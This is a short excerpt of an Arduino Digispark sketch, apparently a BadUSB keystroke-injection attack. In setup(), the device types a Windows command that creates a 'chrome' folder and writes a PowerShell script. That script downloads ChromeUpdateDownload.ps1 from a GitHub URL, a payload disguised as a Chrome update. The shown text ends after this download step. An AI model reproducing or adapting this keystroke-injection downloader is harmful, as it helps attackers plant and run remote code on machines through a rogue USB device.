...
void setup()
{
  ...
  DigiKeyboard.delay(100);  
  DigiKeyboard.println("cd / & mkdir chrome & cd chrome & echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
